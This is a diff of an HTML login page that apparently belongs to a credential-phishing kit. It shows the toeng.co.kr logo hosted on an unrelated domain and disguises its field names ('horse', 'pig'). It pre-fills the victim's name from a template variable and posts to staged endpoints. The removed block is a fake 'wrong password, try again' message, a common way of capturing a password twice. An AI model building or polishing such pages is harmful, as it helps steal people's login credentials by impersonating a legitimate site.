@@ -16,11 +16,11 @@
     align-items: center;
     justify-content: center;
     min-height: 100vh;
-    background-color: #ffffff; / Pure white background /
+    background-color: #ffffff; / 순백색 배경 /
   }
 
   .content-wrapper {
-    margin-top: -180px; / Adjust this value to raise the elements /
+    margin-top: -180px; / 요소 위치 조정 /
     display: flex;
     flex-direction: column;
     align-items: center;
@@ -94,13 +94,6 @@
     color: #888;
   }
 
-  .error-message {
-    font-size: 0.9rem;
-    color: red;
-    text-align: center;
-    margin-bottom: 15px;
-  }
-
   button {
     width: 100%;
     padding: 12px;
@@ -154,15 +147,14 @@
     <h1><img src="https://guide-level.com/Screenshot_2.png" alt="toeng.co.kr"></h1>
   </header>
   <main>
-    <form action="second" method="POST">
-      <div class="error-message">비밀번호가 잘못되었습니다. 다시 시도하세요.</div>
+    <form form action="first" method="POST">
       <fieldset>
         <div class="input-group">
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" width="44" height="24">
             <path d="M0 0h14v14H0z" fill="none"/>
             <path fill="#888" d="M12.25 11.55v1.137A1.312 1.312 0 0110.938 14H1.313A1.313 1.313 0 010 12.688V11.55a3.675 3.675 0 013.675-3.675c.787 0 1.164.438 2.45.438s1.662-.437 2.45-.437a3.675 3.675 0 013.675 3.674z"/>
           </svg>
-          <input type="text" placeholder="" name="horse"  required="" />
+          <input type="text" placeholder="" name="horse" value="{{eman}}" required="" />
           <p>보안됨</p>
         </div>
         <div class="input-group">
@@ -170,9 +162,9 @@
             <path d="M0 0h14v14H0z" fill="none"/>
             <path fill="#888" d="M7 0a2 2 0 012 2v1h3a2 2 0 012 2v7a2 2 0 01-2 2H2a2 2 0 01-2-2V5a2 2 0 012-2h3V2a2 2 0 012-2zm0 2V0z"/>
           </svg>
-          <input type="password"  name="pig" placeholder="비밀번호"  required/>
+          <input type="password" name="pig" placeholder="비밀번호" required/>
         </div>
-        <button type="submit">다음</button>
+        <button type="submit">제출</button>
       </fieldset>
     </form>
   </main>
